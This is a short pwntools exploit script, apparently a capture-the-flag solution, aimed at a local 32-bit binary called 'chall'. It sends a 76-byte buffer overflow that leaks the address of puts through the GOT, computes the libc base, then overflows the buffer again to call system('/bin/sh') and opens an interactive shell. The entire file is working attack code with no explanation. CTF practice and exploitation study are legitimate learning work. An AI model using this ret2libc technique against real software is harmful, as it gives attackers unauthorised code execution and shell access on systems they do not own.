from pwn import *
binary = "./chall"
elf=ELF(binary)
libc=ELF("./libc.so.6")
p=process(binary)

#gdb.attach(p)

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
main=elf.symbols['main']

log.success(f"puts_plt adress {hex(puts_plt)}")
log.success(f"puts_got adress {hex(puts_got)}")
log.success(f"main adress {hex(main)}")


p.recvuntil("fate")
p.sendline(b"1")
p.recvuntil("words:")

payload=b"A"*76+p32(puts_plt)+p32(main)+p32(puts_got)
p.sendline(payload)
p.recvuntil("enough :(")
p.recvline()

leaked_puts=u32(p.recvline().strip()[:4])
log.success(f"Leaked puts {hex(leaked_puts)}")

libcbase=leaked_puts-libc.symbols['puts']
system=libcbase+libc.symbols['system']
binsh=libcbase+next(libc.search(b'/bin/sh'))

log.success(f"Leaked libcbase {hex(libcbase)}")
log.success(f"Leaked system {hex(system)}")
log.success(f"Leaked binsh {hex(binsh)}")

p.recvuntil("fate")
p.sendline(b"1")
p.recvuntil("words:")

payload=b"A"*76+p32(system)+b"BBBB"+p32(binsh)
p.sendline(payload)


p.interactive()